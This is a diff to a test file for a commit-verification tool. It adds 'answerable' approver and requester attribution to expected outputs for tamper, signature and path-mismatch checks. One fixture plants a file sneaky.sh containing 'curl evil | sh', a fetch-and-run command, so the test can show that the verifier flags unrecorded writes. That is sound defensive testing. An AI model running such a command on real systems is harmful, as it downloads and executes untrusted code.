@@ -77,7 +77,13 @@ beforeAll(async () => {
   const readme2 = repo.blob("# demo\n\nTwo.\n");
   sha.two = await repo.landing(
     { "README.md": "# demo\n\nTwo.\n", "src/b.ts": null },
-    { landingId: "lnd_2", proposals: [proposal({ id: "prp_2", writeSet: [{ path: "README.md", blob: readme2 }] }), proposal({ id: "prp_3", writeSet: [{ path: "src/b.ts", blob: null }], readSet: [{ path: "src/b.ts", blob: b1 }] })] },
+    {
+      landingId: "lnd_2",
+      proposals: [
+        proposal({ id: "prp_2", writeSet: [{ path: "README.md", blob: readme2 }], askedBy: { source: "human", createdBy: "lee" } }),
+        proposal({ id: "prp_3", writeSet: [{ path: "src/b.ts", blob: null }], readSet: [{ path: "src/b.ts", blob: b1 }] }),
+      ],
+    },
     { signer },
   );
   // An antibody: the note carries the rejected proposal (whose files never landed) and names the antibody file.
@@ -108,17 +114,17 @@ afterAll(removeAll);
 
 describe("one commit", () => {
   it("prints intact, and intact and signed with --keys, as it always has", async () => {
-    expect(await both(repo.dir, ["HEAD"])).toEqual({ code: 0, out: "intact" });
-    expect(await both(repo.dir, ["HEAD", "--keys", keys.keysFile])).toEqual({ code: 0, out: `intact, signed by ${keys.keyId}` });
-    expect(await both(repo.dir, [sha.unsigned!, "--keys", keys.keysFile])).toEqual({ code: 1, out: "unsigned (landed before signing)" });
-    expect(await both(repo.dir, ["--commit", sha.unsigned!])).toEqual({ code: 0, out: "intact" });
+    expect(await both(repo.dir, ["HEAD"])).toEqual({ code: 0, out: "intact\nanswerable: matt (approved this change)" });
+    expect(await both(repo.dir, ["HEAD", "--keys", keys.keysFile])).toEqual({ code: 0, out: `intact, signed by ${keys.keyId}\nanswerable: matt (approved this change)` });
+    expect(await both(repo.dir, [sha.unsigned!, "--keys", keys.keysFile])).toEqual({ code: 1, out: "unsigned (landed before signing)\nanswerable: matt (approved this change)" });
+    expect(await both(repo.dir, ["--commit", sha.unsigned!])).toEqual({ code: 0, out: "intact\nanswerable: matt (approved this change)" });
     expect(script(repo.dir, [sha.import1!])).toEqual({ code: 1, out: "no FT-Note trailer" });
   });
 
   it("catches the tampered copy of the newest note: the approver changed", async () => {
     expect(await both(repo.dir, ["HEAD", "--tamper"])).toEqual({
       code: 0,
-      out: "intact\ntampered copy: altered (proposals[0].decisions[1].by changed from matt to mallory): the digest no longer matches",
+      out: "intact\nanswerable: matt (approved this change)\ntampered copy: altered (proposals[0].decisions[1].by changed from matt to mallory): the digest no longer matches",
     });
   });
 
@@ -126,14 +132,14 @@ describe("one commit", () => {
     const r = script(repo.dir, [sha.unsigned!, "--tamper", "--tamper-field", "proposals[0].readSet[0].blob"]);
     const read = repo.blob("export const a = 2;\n");
     const flipped = `${read.slice(0, -1)}${(parseInt(read.slice(-1), 16) ^ 1).toString(16)}`;
-    expect(r).toEqual({ code: 0, out: `intact\ntampered copy: altered (proposals[0].readSet[0].blob changed from ${read} to ${flipped}): the digest no longer matches` });
+    expect(r).toEqual({ code: 0, out: `intact\nanswerable: matt (approved this change)\ntampered copy: altered (proposals[0].readSet[0].blob changed from ${read} to ${flipped}): the digest no longer matches` });
     expect((await ft(repo.dir, [`--commit=${sha.unsigned}`, "--tamper", "--tamper-field", "proposals[0].readSet[0].blob"])).out).toBe(r.out);
   });
 
   it("pins the colony by its root commit, and refuses another", async () => {
-    expect(await both(repo.dir, ["HEAD", "--colony", sha.import0!])).toEqual({ code: 0, out: `intact\nroot ${sha.import0} matches the pinned colony` });
+    expect(await both(repo.dir, ["HEAD", "--colony", sha.import0!])).toEqual({ code: 0, out: `intact\nanswerable: matt (approved this change)\nroot ${sha.import0} matches the pinned colony` });
     const other = "0123456789abcdef0123456789abcdef01234567";
-    expect(await both(repo.dir, ["HEAD", "--colony", other])).toEqual({ code: 1, out: `intact\nthis history's root is ${sha.import0}, not the pinned ${other}` });
+    expect(await both(repo.dir, ["HEAD", "--colony", other])).toEqual({ code: 1, out: `intact\nanswerable: matt (approved this change)\nthis history's root is ${sha.import0}, not the pinned ${other}` });
   });
 });
 
@@ -143,11 +149,11 @@ describe("the whole trunk", () => {
     const s = (k: string): string => sha[k]!.slice(0, 12);
     expect(r.code).toBe(0);
     expect(r.out.split("\n")).toEqual([
-      `${s("newest")}  intact, signed by ${keys.keyId}, paths match (1 file)`,
-      `${s("revert")}  intact, signed by ${keys.keyId}, paths match (revert of ${s("two")}: 2 files put back)`,
-      `${s("antibody")}  intact, signed by ${keys.keyId}, paths match (antibody file .firetrident/antibodies/ab_1.json; the note does not record its blob)`,
-      `${s("two")}  intact, signed by ${keys.keyId}, paths match (2 files)`,
-      `${s("unsigned")}  intact, unsigned (landed before signing), paths match (2 files)`,
+      `${s("newest")}  intact, signed by ${keys.keyId}, paths match (1 file), answerable: matt (approved this change)`,
+      `${s("revert")}  intact, signed by ${keys.keyId}, paths match (revert of ${s("two")}: 2 files put back), answerable: matt (reverted lnd_2)`,
+      `${s("antibody")}  intact, signed by ${keys.keyId}, paths match (antibody file .firetrident/antibodies/ab_1.json; the note does not record its blob), answerable: matt (rejected prp_bad, which taught this antibody)`,
+      `${s("two")}  intact, signed by ${keys.keyId}, paths match (2 files), answerable: unknown (1 of 2: lee asked for this intent; 1 of 2: unknown: the note was written before notes recorded who asked for each intent)`,
+      `${s("unsigned")}  intact, unsigned (landed before signing), paths match (2 files), answerable: matt (approved this change)`,
       `${s("unsealed")}  landed before notes were sealed (no FT-Note trailer)`,
       `${s("import1")}..${s("import0")}  2 commits that are not landings (no FT-Note trailer)`,
       `root ${sha.import0} matches the pinned colony`,
@@ -156,8 +162,8 @@ describe("the whole trunk", () => {
     ]);
     // Without keys, and from an older commit for a few commits.
     expect((await both(repo.dir, ["--all", "--from", sha.two!, "--limit", "2"])).out.split("\n")).toEqual([
-      `${s("two")}  intact, paths match (2 files)`,
-      `${s("unsigned")}  intact, paths match (2 files)`,
+      `${s("two")}  intact, paths match (2 files), answerable: unknown (1 of 2: lee asked for this intent; 1 of 2: unknown: the note was written before notes recorded who asked for each intent)`,
+      `${s("unsigned")}  intact, paths match (2 files), answerable: matt (approved this change)`,
       "checked 2 landings in 2 commits: 2 intact, signatures not checked (give --keys), 2 paths match, 0 failures",
     ]);
   });
@@ -202,7 +208,7 @@ describe("what fails", () => {
     await r.landing({ "x.txt": "x\n" }, { landingId: "lnd_c", proposals: [proposal({ id: "prp_c", writeSet: [{ path: "x.txt", blob: r.blob("x\n") }] })], certification: { status: "green" } as never });
     expect(await both(r.dir, ["HEAD", "--tamper", "--tamper-field", "certification.status"])).toEqual({
       code: 1,
-      out: "intact\ntampered copy: intact (certification.status changed from green to mallory): the digest still matches, so this check cannot see that change",
+      out: "intact\nanswerable: unknown (the note was written before notes recorded who asked for each intent)\ntampered copy: intact (certification.status changed from green to mallory): the digest still matches, so this check cannot see that change",
     });
   });
 
@@ -214,8 +220,8 @@ describe("what fails", () => {
     const res = await both(r.dir, ["--all"]);
     expect(res.code).toBe(1);
     expect(res.out.split("\n").slice(0, 2)).toEqual([
-      `${other.slice(0, 12)}  intact, paths do not match: x.txt: the commit writes ${r.blob("y\n").slice(0, 12)}, the note says it wrote ${r.blob("z\n").slice(0, 12)}`,
-      `${extra.slice(0, 12)}  intact, paths do not match: sneaky.sh: the commit writes ${r.blob("curl evil | sh\n").slice(0, 12)}, and no write set in the note names it`,
+      `${other.slice(0, 12)}  intact, paths do not match: x.txt: the commit writes ${r.blob("y\n").slice(0, 12)}, the note says it wrote ${r.blob("z\n").slice(0, 12)}, answerable: unknown (the note was written before notes recorded who asked for each intent)`,
+      `${extra.slice(0, 12)}  intact, paths do not match: sneaky.sh: the commit writes ${r.blob("curl evil | sh\n").slice(0, 12)}, and no write set in the note names it, answerable: unknown (the note was written before notes recorded who asked for each intent)`,
     ]);
     expect(res.out).toContain("2 failures");
   });
@@ -228,7 +234,7 @@ describe("what fails", () => {
     const late = await r.landing({ "x.txt": "2\n" }, { landingId: "lnd_u", proposals: [proposal({ id: "prp_u", writeSet: [{ path: "x.txt", blob: r.blob("2\n") }] })] });
     const res = await both(r.dir, ["--all", "--keys", key.keysFile]);
     expect(res.code).toBe(1);
-    expect(res.out.split("\n")[0]).toBe(`${late.slice(0, 12)}  intact, unsigned, though an older landing is signed, paths match (1 file)`);
+    expect(res.out.split("\n")[0]).toBe(`${late.slice(0, 12)}  intact, unsigned, though an older landing is signed, paths match (1 file), answerable: unknown (the note was written before notes recorded who asked for each intent)`);
     // Signed by a key the keys file does not list.
     const stranger = await signingKey(r.dir);
     const res2 = await both(r.dir, ["--all", "--keys", stranger.keysFile]);
